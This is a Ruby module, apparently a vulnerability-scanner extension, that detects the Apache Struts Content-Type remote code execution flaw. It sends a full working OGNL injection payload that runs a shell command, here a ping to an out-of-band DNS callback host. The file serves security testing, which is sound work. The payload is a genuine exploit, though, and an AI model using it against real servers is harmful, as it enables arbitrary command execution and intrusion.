module ScannerExtensions
  module Extensions
    class RceApacheStruts < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = :rce
        @point               = ->(p) { p.to_a == [:header, 'CONTENT-TYPE'] }

        @defaults = {
          timeout: 15,
          sleep: 10
        }
      end

      def oob_callback(object, token)
        array = ScannerExtensions::Helpers::OobDnsClient.get token
        unless array.empty?
          curl = object.curl_helper(value: payload)
          object.vuln(
            extension: 'rce_apache_struts',
            template: '/rce/apache_struts',
            args: {
              exploit_example: curl,
              footers: {
                exploit_example: {
                  view: 'oob_dns',
                  splitter: "\n",
                  params: {
                    hosts: array
                  }
                }
              }
            }
          )
          return object
        end
        return nil
      end

      def run(object, params)
        params = @defaults.merge(params)

        token    = ScannerExtensions::Helpers::OobDnsClient.create

        payload  = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
        payload += "ping -c 3 #{token} || ping -n 3 #{token}"
        payload += "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        object.http(value: payload, timeout: params[:timeout], open_timeout: params[:open_timeout])

        if object.oob_callbacks
          object.oob_callbacks << Proc.new do
            oob_callback(object, token)
          end
        else
          sleep params[:sleep]
          oob_callback(object, token)
        end
      end
    end
  end
end
